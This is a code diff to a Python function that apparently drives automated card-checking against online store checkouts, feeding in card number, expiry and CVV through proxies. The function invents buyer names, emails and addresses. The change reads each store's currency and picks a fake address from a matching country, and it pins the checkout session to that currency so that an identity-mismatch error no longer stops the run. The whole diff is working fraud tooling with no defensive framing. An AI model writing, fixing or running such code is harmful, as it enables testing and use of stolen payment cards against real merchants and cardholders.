@@ -345,18 +345,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             'sec-ch-ua-platform': '"Windows"'
         }
 
-        address_info = pick_addr(ourl)
-        country_code = address_info["countryCode"]
-        
         firstName, lastName = Utils.get_random_name()
         email = Utils.generate_email(firstName, lastName)
-        
-        phone = address_info["phone"]
-        street = address_info["address1"]
-        city = address_info["city"]
-        state = address_info["zoneCode"]
-        s_zip = address_info["postalCode"]
-        address2 = ""
 
         if not variant_id:
             info = await fetch_products(ourl, proxy_str)
@@ -371,6 +361,29 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             url = ourl
             cart = url + '/cart/add.js'
             checkout = url + '/checkout/'
+
+            # the session's presentment currency follows the buyer's geo — a currency
+            # mismatch against the buyer identity triggers
+            # BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH at submit. Read the
+            # store's currency and pick a matching-country address.
+            store_currency = ""
+            try:
+                _cur = await session.get(url + '/cart.js', proxy=proxy, timeout=10)
+                if _cur.status == 200:
+                    _mt = re.search(r'"currency"\s*:\s*"([A-Z]{3})"', await _cur.text())
+                    if _mt:
+                        store_currency = _mt.group(1)
+            except Exception:
+                pass
+            address_info = pick_addr(ourl, cc=store_currency)
+            country_code = address_info["countryCode"]
+
+            phone = address_info["phone"]
+            street = address_info["address1"]
+            city = address_info["city"]
+            state = address_info["zoneCode"]
+            s_zip = address_info["postalCode"]
+            address2 = ""
 
             cart_headers = {
                 **headers,
@@ -406,7 +419,11 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             text = ""
             checkout_url = ""
             attempt_token = ""
-            for create_method, create_url in (("POST", checkout), ("GET", checkout), ("GET", f"{url}/cart/{variant_id}:1")):
+            # the cart permalink with the store currency pins the session's market to
+            # the store (not the IP geo) — prevents the presentment-currency mismatch
+            create_paths = [("GET", f"{url}/cart/{variant_id}:1?currency={store_currency}" if store_currency else f"{url}/cart/{variant_id}:1"),
+                            ("POST", checkout), ("GET", checkout)]
+            for create_method, create_url in create_paths:
                 try:
                     if create_method == "POST":
                         response = await session.post(url=create_url, allow_redirects=True, headers=checkout_headers, proxy=proxy)
